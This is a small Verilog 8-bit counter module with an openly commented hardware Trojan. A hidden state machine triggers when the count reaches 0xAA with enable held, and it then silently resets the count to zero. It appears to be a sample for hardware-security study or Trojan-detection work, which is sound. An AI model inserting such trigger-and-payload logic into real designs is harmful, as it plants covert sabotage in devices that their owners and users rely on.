module counter8(input clk, input rst_n, input en, output reg [7:0] count);

  // Trojan FSM state
  reg [1:0] fsm_state;
  localparam FSM_IDLE = 2'b00;
  localparam FSM_S1   = 2'b01;
  localparam FSM_TRIG = 2'b10;

  // Trojan FSM transitions
  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      fsm_state <= FSM_IDLE;
    end else begin
      case (fsm_state)
        FSM_IDLE: if (count == 8'hAA && en) fsm_state <= FSM_S1;
        FSM_S1:   if (en) fsm_state <= FSM_TRIG; else fsm_state <= FSM_IDLE;
        FSM_TRIG: fsm_state <= FSM_IDLE;
        default:  fsm_state <= FSM_IDLE;
      endcase
    end
  end

  // Trojan payload: modify count behavior when FSM triggers
  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      count <= 0;
    end else if (fsm_state == FSM_TRIG) begin
      // Trojan payload: corrupt count by resetting to 0
      count <= 8'h00;
    end else if (en) begin
      count <= count + 1;
    end
  end

endmodule